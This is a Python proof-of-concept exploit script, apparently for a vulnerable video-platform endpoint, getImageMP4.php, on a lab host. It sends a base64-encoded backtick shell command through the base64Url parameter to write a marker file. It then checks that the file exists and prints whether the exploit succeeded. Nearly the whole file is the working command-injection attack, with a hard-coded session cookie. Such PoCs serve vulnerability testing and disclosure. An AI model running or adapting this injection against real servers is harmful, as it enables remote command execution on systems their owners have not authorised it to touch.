import requests
import time

## 未执行注入之前访问注入文件名
def check():
    burp0_url = "http://192.168.1.9:8889/objects/thissystemhavebeenexploited1234"
    burp0_cookies = {"PHPSESSID": "20a4eca1f4db870656270e54d8dec8ac", "_ga": "GA1.1.500274602.1586273581",
                     "_gid": "GA1.1.150033256.1586273581"}
    burp0_headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0",
                     "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
                     "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
                     "Accept-Encoding": "gzip, deflate", "Connection": "close", "Upgrade-Insecure-Requests": "1"}
    a = requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies)
    return a

def poc():
    burp0_url = "http://192.168.1.9:8889/objects/getImageMP4.php?base64Url=YGVjaG8gMTIzIHwgdGVlIC1hIHRoaXNzeXN0ZW1oYXZlYmVlbmV4cGxvaXRlZDEyMzRg&format=jpg"
    burp0_cookies = {"PHPSESSID": "20a4eca1f4db870656270e54d8dec8ac", "_ga": "GA1.1.500274602.1586273581",
                     "_gid": "GA1.1.150033256.1586273581"}
    burp0_headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0",
                     "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
                     "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
                     "Accept-Encoding": "gzip, deflate", "Connection": "close", "Upgrade-Insecure-Requests": "1"}
    a = requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies)
    return a



if __name__ == "__main__":
    time.sleep(100)
    a1 = str(check())
    #print(a1)
    b = poc()
    #print(b)
    time.sleep(5)
    a = str(check())
   # print(a)
    if ('200' in a) :
        print('PoC success!')
    else :
        print('PoC fail!')


